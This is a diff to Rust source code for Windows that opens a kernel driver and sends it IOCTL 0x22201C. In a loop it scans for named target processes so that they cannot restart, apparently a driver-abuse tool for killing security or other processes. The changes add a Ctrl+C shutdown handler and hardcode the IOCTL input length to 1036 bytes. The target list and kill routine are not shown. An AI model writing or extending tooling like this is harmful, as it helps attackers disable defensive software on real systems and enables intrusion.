@@ -1,9 +1,12 @@
+use ctrlc;
 use anyhow::{Context, Result, bail};
 use std::ptr;
 use std::ffi::CStr;
 use std::mem::size_of;
 use std::os::windows::ffi::OsStrExt;
 use std::ffi::OsStr;
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, Ordering};
 use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
 use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
 use winapi::um::errhandlingapi::GetLastError;
@@ -204,7 +207,7 @@ impl Driver {
                 self.hDriver,
                 0x22201C,
                 buffer.as_mut_ptr() as LPVOID, 
-                buffer.len(),
+                1036,
                 ptr::null_mut(),        
                 0,
                 &mut bytes_returned,
@@ -245,9 +248,20 @@ fn main() -> Result<()> {
     let hDriver = Driver::Initialize()?;
     println!("[+] Driver ready for operation, Handle: {:p}", &hDriver);
     println!("[*] Scanning for target processes...");
+    println!("[*] Press CTRL+C to stop...");
+
+    // CTRL+C Handler setup
+    let running = Arc::new(AtomicBool::new(true));
+    ctrlc::set_handler({
+            let running = Arc::clone(&running);
+            move || {
+                println!("[!] Shutting down...");
+                running.store(false, Ordering::SeqCst);
+            }
+        })?;
     
     // Loop to prevent processes for restarting
-    loop {
+    while running.load(Ordering::SeqCst) {
         for p in PROCESSES {
             if let Ok(pid) = pid_by_name(p) {
                 println!("  -- Found {} - PID: {}", p, pid, );
